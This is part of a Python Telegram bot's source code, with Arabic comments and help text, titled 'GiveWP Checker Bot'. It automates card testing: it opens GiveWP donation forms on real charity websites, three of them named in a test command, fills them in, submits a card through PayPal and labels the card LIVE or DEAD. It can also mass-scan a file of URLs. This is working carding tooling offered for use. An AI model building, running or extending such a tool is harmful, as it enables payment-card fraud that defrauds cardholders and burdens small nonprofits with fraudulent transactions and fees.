    """يجرب Playwright أولاً، ثم requests fallback"""
    if HAS_PW:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                engine = PlaywrightEngine(url, card, verbose=False)
                r = loop.run_until_complete(engine.run())
                if r["status"] in ("LIVE", "UNKNOWN"):
                    return r
                # لو Playwright فشل فشل كامل، نجرب requests
                if r["status"] == "DEAD" and r["code"] not in (
                    "CLOUDFLARE", "CAPTCHA", "GATEWAY_DISABLED", "FORM_NOT_PUBLISHED"
                ):
                    req = RequestsEngine(url, card, verbose=False)
                    r2 = req.charge()
                    if r2["status"] == "LIVE":
                        return r2
                    return r
                return r
            finally:
                loop.close()
        except Exception as e:
            print(f"Playwright error: {e}")
            # fallback
            try:
                req = RequestsEngine(url, card, verbose=False)
                return req.charge()
            except Exception as e2:
                return {"status": "DEAD", "code": f"ALL_FAILED: {str(e2)[:80]}", "debug": {}}
    else:
        req = RequestsEngine(url, card, verbose=False)
        return req.charge()


# ═══════════════════════════════════════════════════════════════
# BOT HANDLERS
# ═══════════════════════════════════════════════════════════════
def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup)
    except Exception as e:
        print(f"send: {e}")
        return None

def safe_edit(chat_id, msg_id, text):
    try:
        return bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text)
    except:
        return None


@bot.message_handler(commands=["start"])
def cmd_start(message):
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📖 Help", callback_data="help"))
    text = f"""<b>🌐 GiveWP Checker Bot</b>

<b>User:</b> {message.from_user.first_name}
<b>ID:</b> <code>{message.from_user.id}</code>

━━━━━━━━━━━━━━━━━━━━
<b>Commands:</b>
/paypal <code>&lt;url&gt;</code> — فحص موقع
/mass — فحص ملف روابط
/test — فحص 3 مواقع تجريبية
/stop — إيقاف
━━━━━━━━━━━━━━━━━━━━
⚡ Playwright + Requests 🔥"""
    safe_send(message.chat.id, text, reply_markup=kb)


@bot.callback_query_handler(func=lambda c: c.data == "help")
def cb_help(call):
    text = """<b>📖 Help</b>

<b>الاستخدام:</b>
<code>/paypal https://site.com/donate</code>

البوت:
1. يفتح المتصفح ويلاقي الفورم
2. يملأ البيانات + المبلغ
3. يضغط تبرع
4. يدخل الكارت في PayPal
5. يقرأ الرد النهائي من الموقع

<b>النتائج:</b>
✅ LIVE — كارت شغال
❌ DEAD — فشل/gateway معطل

<b>الوقت:</b> 20-40s لكل موقع"""
    try:
        bot.answer_callback_query(call.id)
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id)
    except:
        pass


@bot.message_handler(commands=["paypal"])
def cmd_paypal(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) != 2:
        safe_send(message.chat.id, "❌ Usage: <code>/paypal URL</code>")
        return
    url = parts[1].strip()
    if not url.startswith(("http://", "https://")):
        safe_send(message.chat.id, "❌ Invalid URL")
        return

    status_msg = safe_send(message.chat.id, f"🔍 Scanning...\n<code>{url[:80]}</code>")
    if not status_msg:
        return

    def run():
        try:
            result = check_site(url, TEST_CARD)
            icon = "✅" if result["status"] == "LIVE" else "❌"
            text = f"""{icon} <b>{result["status"]}</b> | <code>{result["code"]}</code>

🔗 <code>{url[:100]}</code>"""
            if result.get("raw"):
                text += f"\n\n📝 <b>Raw:</b>\n<code>{result['raw'][:400]}</code>"
            safe_edit(message.chat.id, status_msg.message_id, text)
        except Exception as e:
            safe_edit(message.chat.id, status_msg.message_id, f"❌ Error: {str(e)[:200]}")

    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["test"])
def cmd_test(message):
    sites = [
        ("stychnohumanitarian", "https://www.stychnohumanitarianfoundation.com/donations/donation-form/"),
        ("dandelions", "https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"),
        ("svdpvenicefl", "https://svdpvenicefl.org/donations/donations/"),
    ]
    status_msg = safe_send(message.chat.id, f"🔍 Testing {len(sites)} sites...")
    if not status_msg:
        return

    def run():
        results = []
        for name, url in sites:
            try:
                safe_edit(message.chat.id, status_msg.message_id,
                          f"🔍 {name}... ({len(results)}/{len(sites)})")
                r = check_site(url, TEST_CARD)
                results.append((name, r["status"], r["code"]))
            except Exception as e:
                results.append((name, "ERROR", str(e)[:40]))

        text = "<b>📊 Results:</b>\n\n"
        for n, s, c in results:
            icon = "✅" if s == "LIVE" else "❌"
            text += f"{icon} <b>{n}</b>: {c}\n"
        safe_edit(message.chat.id, status_msg.message_id, text)

    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    safe_send(message.chat.id, "⏹️ No active process")


@bot.message_handler(commands=["mass"])
def cmd_mass(message):
    safe_send(message.chat.id, "📁 Send .txt file with URLs (one per line)")


@bot.message_handler(content_types=["document"])
def on_doc(message):
    try:
        fi = bot.get_file(message.document.file_id)
        data = bot.download_file(fi.file_path)
        links = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
        if not links:
            safe_send(message.chat.id, "❌ Empty file")
            return

        status_msg = safe_send(message.chat.id, f"📊 Scanning {len(links)} links...")
        if not status_msg:
            return

        def run():
            live = 0
            for i, link in enumerate(links):
                try:
                    safe_edit(message.chat.id, status_msg.message_id,
                              f"📊 {i+1}/{len(links)}\n✅ Live: {live}\n\n<code>{link[:60]}</code>")
                    r = check_site(link, TEST_CARD)
                    if r["status"] == "LIVE":
                        live += 1
                        safe_send(message.chat.id,
                                  f"✅ LIVE: <code>{link[:80]}</code>\n{r['code']}")
                except:
                    pass
            safe_edit(message.chat.id, status_msg.message_id,
                      f"📊 Done!\n\n✅ Live: {live}\n❌ Dead: {len(links)-live}")

        threading.Thread(target=run, daemon=True).start()
    except Exception as e:
        safe_send(message.chat.id, f"❌ Error: {str(e)[:100]}")


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 60)
    print("🔥 GiveWP Bot — Complete Edition")
    print("=" * 60)
    print(f"Owner: {OWNER_ID}")
    print(f"Token: {BOT_TOKEN[:20]}...")
    print(f"Playwright: {'✅' if HAS_PW else '❌ (requests only)'}")
    print(f"Browsers: {os.environ.get('PLAYWRIGHT_BROWSERS_PATH', 'default')}")
    print("✅ Starting bot...")

    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
    except KeyboardInterrupt:
        print("\n⏹️ Stopped")
    except Exception as e:
        print(f"❌ {e}")
        traceback.print_exc()
        sys.exit(1)
